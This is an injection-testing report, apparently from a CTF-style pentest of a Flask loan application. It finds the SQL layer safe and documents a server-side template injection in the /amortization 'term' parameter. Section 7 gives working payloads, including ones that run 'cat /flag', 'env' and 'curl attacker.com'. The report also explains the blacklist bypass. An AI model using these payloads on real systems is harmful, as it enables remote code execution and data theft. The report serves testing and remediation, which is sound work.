# Injection Analysis Report (SQLi & Command Injection)

## 1. Executive Summary

- **Analysis Status:** Complete  
- **Key Outcome:** One high-confidence, externally exploitable Command Injection vulnerability (via SSTI) was identified in the `/amortization` endpoint. No SQL injection vulnerabilities were found. The command injection finding has been passed to the exploitation phase via the machine-readable queue at `deliverables/injection_exploitation_queue.json`.  
- **Purpose of this Document:** This report provides the strategic context, security architecture analysis, and environmental intelligence necessary to effectively exploit the vulnerability listed in the queue. It documents all analyzed vectors including those confirmed secure.

## 2. Dominant Vulnerability Patterns

### Pattern 1: F-String Template Injection (Command Injection via SSTI)

- **Description:** User input is directly interpolated into a Python f-string that constructs a Jinja2 template, which is then evaluated by `render_template_string()`. This creates a two-stage evaluation vulnerability where the f-string processes user input first, embedding it into the template structure before Jinja2 evaluates the template.

- **Implication:** When user input is embedded in an f-string using single braces `{variable}` rather than escaped quadruple braces `{{{{variable}}}}`, the input becomes part of the Jinja2 template's syntactic structure rather than just a data value. This allows injection of arbitrary Python expressions that Jinja2 will evaluate, leading to Remote Code Execution (RCE).

- **Representative:** INJ-VULN-01 - `/amortization` endpoint, `term` parameter

### Pattern 2: Secure ORM Usage (All SQL Operations)

- **Description:** The application consistently uses SQLAlchemy ORM methods (`.filter_by()`, `.query.get()`, attribute assignment) for all database operations. No raw SQL string construction or concatenation was observed in any network-accessible endpoint.

- **Implication:** SQLAlchemy's ORM layer automatically uses parameterized queries with bound parameters, which prevents SQL injection by treating user input as data values rather than SQL syntax, regardless of input content.

- **Representative:** All SQL operations across `/login` and `/profile` endpoints are secure

## 3. Strategic Intelligence for Exploitation

### Defensive Evasion (Blacklist Filter Analysis)

- **Blacklist Implementation:** The vulnerable `/amortization` endpoint implements a character blacklist at routes.py:128-129 that blocks `{`, `}`, and `%` characters.

- **Critical Bypass:** The blacklist is fundamentally flawed because:
  1. It blocks Jinja2 template delimiters but the injection point is INSIDE an existing Python expression (`range()` call)
  2. Python method chaining syntax does NOT require curly braces: `).__import__('os').popen('cmd').read()#`
  3. The `#` character (not blocked) can comment out trailing syntax errors
  4. Characters needed for exploitation are all allowed: `(`, `)`, `.`, `_`, `'`, `"`, `#`

- **Recommendation:** The blacklist provides NO effective protection. Exploitation is trivial using method chaining syntax.

### Authentication Bypass (Critical Security Failure)

- **Missing Authentication:** The `/amortization` endpoint completely lacks authentication checks. Unlike protected endpoints that verify `session.get('user_id')`, this endpoint processes requests from anonymous users.

- **Comparison with Protected Endpoints:**
  - `/home`, `/profile`, `/loan_details`, `/total_loan_payments` all implement inline session validation
  - `/amortization` has NO session check whatsoever

- **Implication:** External attackers can exploit the command injection vulnerability WITHOUT any credentials or session cookies. This makes INJ-VULN-01 the most critical vulnerability in the application.

### F-String vs Template Variable Pattern Recognition

- **Vulnerable Pattern (found in `/amortization`):**
  ```python
  term = request.args.get('term', type=str)  # User input as string
  template = f"{{% for row in range({term}) %}}"  # Single braces - VULNERABLE
  render_template_string(template)
  ```
  Result: User input is embedded into template STRUCTURE

- **Safe Pattern (found in `/total_loan_payments`):**
  ```python
  principal = request.args.get('principal', type=str)  # User input as string
  template = f"{{{{ principal }}}}"  # Quadruple braces - SAFE
  render_template_string(template, principal=principal)
  ```
  Result: User input is passed as template DATA, not structure

- **Critical Distinction:** The number of braces matters:
  - `{variable}` in f-string → Direct interpolation (VULNERABLE)
  - `{{{{variable}}}}` in f-string → Escapes to `{{ variable }}` (Jinja2 placeholder - SAFE)

### Confirmed Database Technology

- **Database:** MySQL 5.7.15 (accessed via PyMySQL driver)
- **ORM:** Flask-SQLAlchemy 3.1.1 (wraps SQLAlchemy ORM)
- **Query Parameterization:** All database operations use ORM methods with automatic parameter binding
- **SQL Injection Status:** NO SQL injection vulnerabilities found in any network-accessible endpoint

## 4. Vectors Analyzed and Confirmed Secure

These input vectors were traced through complete source-to-sink analysis and confirmed to have robust, context-appropriate defenses. They are **low-priority** for further testing.

### SQL Injection - Secure Vectors

| **Source (Parameter/Key)** | **Endpoint/File Location** | **Defense Mechanism Implemented** | **Verdict** |
|---------------------------|----------------------------|-----------------------------------|-------------|
| `username` | POST `/login` (routes.py:25) | SQLAlchemy ORM `.filter_by()` with parameter binding | SAFE |
| `password` | POST `/login` (routes.py:26) | SQLAlchemy ORM `.filter_by()` with parameter binding | SAFE |
| `name` | POST `/profile` (routes.py:66) | SQLAlchemy ORM attribute assignment with parameterized UPDATE | SAFE |
| `lastname` | POST `/profile` (routes.py:67) | SQLAlchemy ORM attribute assignment with parameterized UPDATE | SAFE |
| `email` | POST `/profile` (routes.py:68) | SQLAlchemy ORM attribute assignment with parameterized UPDATE | SAFE |
| `loan_amount` | POST `/profile` (routes.py:69) | `float()` type conversion + SQLAlchemy ORM parameterized UPDATE | SAFE |
| `loan_term_months` | POST `/profile` (routes.py:70) | `int()` type conversion + SQLAlchemy ORM parameterized UPDATE | SAFE |
| `monthly_payment` | POST `/profile` (routes.py:71) | `float()` type conversion + SQLAlchemy ORM parameterized UPDATE | SAFE |

**SQL Defense Analysis:**
- All SQL operations use SQLAlchemy ORM methods that automatically generate parameterized queries
- User input is passed as bound parameters, never concatenated into SQL strings
- Type conversions (`int()`, `float()`) provide additional validation for numeric fields
- No raw SQL construction (`.execute()` with strings, `.text()` calls) found in any endpoint
- **Conclusion:** The application's SQL layer is robustly protected against injection attacks

### Command Injection - Secure Vectors

| **Source (Parameter/Key)** | **Endpoint/File Location** | **Defense Mechanism Implemented** | **Verdict** |
|---------------------------|----------------------------|-----------------------------------|-------------|
| `principal` | GET `/total_loan_payments` (routes.py:101) | F-string uses escaped braces `{{{{principal}}}}` + passed as template variable | SAFE |
| `payment` | GET `/total_loan_payments` (routes.py:102) | `float()` type conversion + F-string escaped braces + template variable | SAFE |
| `term` | GET `/total_loan_payments` (routes.py:103) | `int()` type conversion + F-string escaped braces + template variable | SAFE |

**Command Injection Defense Analysis:**
- The `/total_loan_payments` endpoint correctly uses quadruple braces `{{{{}}}}` in f-strings
- After f-string processing, these become Jinja2 placeholders `{{ }}`, not direct interpolation
- User input is passed as template variables to `render_template_string()`, not embedded in structure
- Type conversions on `payment` and `term` restrict input to numeric values
- **Conclusion:** This endpoint demonstrates the CORRECT way to use f-strings with Jinja2 templates

### No Direct Command Execution Sources Found

**Analysis Results:**
- No usage of `os.system()` in any network-accessible code
- No usage of `os.popen()` as a direct sink (only found as part of SSTI exploitation path)
- No usage of `subprocess` module (module not imported in application)
- No usage of `eval()` or `exec()` functions
- **Conclusion:** The only command execution vulnerability is indirect via SSTI in `/amortization`

## 5. Analysis Constraints and Blind Spots

### Secure by Default Architecture

- **ORM Protection:** The application's consistent use of SQLAlchemy ORM provides defense-in-depth against SQL injection. Even if developers add new database queries, they would need to actively bypass the ORM (e.g., using raw SQL strings) to create vulnerabilities.

- **Limitation:** This analysis assumes no stored procedures are called that might contain SQL injection vulnerabilities internally. The models.py file shows no stored procedure calls, but if they exist and are called elsewhere, they remain unanalyzed.

### Template String Inconsistency

- **Inconsistent Patterns:** The codebase shows two different f-string patterns for Jinja2 templates:
  1. Correct usage with escaped braces in `/total_loan_payments` 
  2. Vulnerable direct interpolation in `/amortization`

- **Risk:** If developers add new endpoints with `render_template_string()`, they may not understand which pattern is secure, potentially creating new SSTI vulnerabilities.

### Limited Scope - Network-Accessible Only

- **Focus:** This analysis covered only network-accessible endpoints reachable via HTTP on port 37579
- **Exclusions:** 
  - Local-only scripts or CLI tools (if any exist)
  - Administrative interfaces not exposed via HTTP
  - Background jobs or scheduled tasks (none identified in reconnaissance)
  - Docker container internals beyond the Flask application

### Type Conversion Protection Gaps

- **Observation:** Numeric parameters in `/profile` endpoint use `int()` and `float()` conversions, which raise `ValueError` exceptions on invalid input but have NO error handling.

- **Not an Injection Risk:** While this creates a denial-of-service opportunity (crash the endpoint with invalid input), it does NOT create injection vulnerabilities because:
  1. The ValueError prevents invalid input from reaching the database
  2. The ORM would still parameterize the query even if type conversion were bypassed
  
- **Blind Spot:** Error handling analysis is outside the scope of injection testing, but this pattern could cause availability issues.

## 6. Technical Deep Dive: Why SQLAlchemy ORM is Secure

### Parameter Binding Mechanism

When the application executes:
```python
user = User.query.filter_by(username=username, password=password).first()
```

**SQLAlchemy generates:**
```sql
SELECT * FROM user WHERE username = %s AND password = %s LIMIT 1
```

**Parameter binding flow:**
1. SQL query structure sent to database with `%s` placeholders
2. User input values sent SEPARATELY as bound parameters
3. MySQL driver (PyMySQL) ensures parameters are treated as data, not SQL syntax
4. Even malicious input like `' OR '1'='1` is treated as a literal string to compare

**Why This is Secure:**
- No string concatenation occurs in Python code
- Database receives SQL structure and data separately
- MySQL's prepared statement mechanism prevents interpretation of data as SQL commands
- This protection applies regardless of input content

### ORM Attribute Assignment for UPDATE

When the application executes:
```python
user.name = request.form['name']
user.email = request.form['email']
db.session.commit()
```

**SQLAlchemy generates:**
```sql
UPDATE user SET name = %s, email = %s WHERE id = %s
```

**Security Properties:**
- ORM tracks changes to model attributes
- `commit()` generates parameterized UPDATE statement
- All attribute values are bound as parameters
- User input never influences SQL structure (table names, column names, WHERE clause structure)

### Contrast with Vulnerable Pattern (Not Found in This App)

**Vulnerable code would look like:**
```python
# ANTI-PATTERN - NOT FOUND IN APPLICATION
query = f"SELECT * FROM user WHERE username = '{username}'"
db.session.execute(text(query))
```

**Why this would be vulnerable:**
- F-string directly embeds user input into SQL string
- Input like `' OR '1'='1` would alter SQL structure
- Database receives complete SQL command with malicious syntax already embedded

**Application Status:** No instances of this vulnerable pattern were found.

## 7. Exploitation Readiness Assessment

### INJ-VULN-01 Exploitation Path

**Target:** `/amortization` endpoint, `term` parameter

**Exploitation Steps:**
1. Craft URL with malicious term parameter: `http://localhost:37579/amortization?term=60).__import__('os').popen('cat /flag').read()#`
2. Send GET request (no authentication required)
3. F-string processes input, embedding it into template: `{% for row in range(60).__import__('os').popen('cat /flag').read()#) %}`
4. Jinja2 evaluates template, executing Python expression
5. `os.popen()` executes shell command
6. Flag contents returned in HTTP response

**Success Criteria:**
- HTTP 200 response (not 400 error from blacklist)
- HTML page contains command output
- For CTF objective: Response contains flag value from `/flag` file

**Expected Output Location:**
- Command output may appear in HTML structure
- Likely embedded in table cells or rendered in page content
- May need to inspect HTML source if not visible in rendered page

### Payload Variations for Testing

**Basic Validation (prove RCE):**
```
term=60).__import__('os').popen('whoami').read()#
```

**Flag Retrieval (CTF objective):**
```
term=60).__import__('os').popen('cat /flag').read()#
```

**Environment Reconnaissance:**
```
term=60).__import__('os').popen('env').read()#
```

**Network Testing:**
```
term=60).__import__('os').popen('curl attacker.com').read()#
```

### URL Encoding for Clean Exploitation

**URL-encoded payload (recommended for tools):**
```
http://localhost:37579/amortization?term=60%29.__import__%28%27os%27%29.popen%28%27cat%20/flag%27%29.read%28%29%23
```

**Character encoding map:**
- `)` → `%29`
- `(` → `%28`
- `'` → `%27`
- ` ` (space) → `%20`
- `#` → `%23`

## 8. Recommendations for Remediation (Post-Exploitation Reference)

While remediation is outside the scope of this analysis phase, documenting the root causes will assist in post-exploitation reporting:

### INJ-VULN-01 Root Causes

1. **Type Mismatch:** Parameter extracted as `str` when `int` expected for `range()` call
2. **Dangerous F-String Pattern:** Direct interpolation `{term}` instead of escaped `{{{{term}}}}`
3. **Insufficient Sanitization:** Blacklist-based filtering instead of whitelist validation or proper escaping
4. **Missing Authentication:** No session check before processing user input
5. **Inappropriate Template Construction:** Dynamic template generation from user input

### Secure Pattern Reference

**The `/total_loan_payments` endpoint demonstrates the correct approach:**
- Extract with appropriate type: `request.args.get('term', type=int)`
- Use escaped braces in f-strings: `f"{{{{ term }}}}"`
- Pass as template variable: `render_template_string(template, term=term)`
- Require authentication: Check `session.get('user_id')` before processing

---

**END OF INJECTION ANALYSIS REPORT**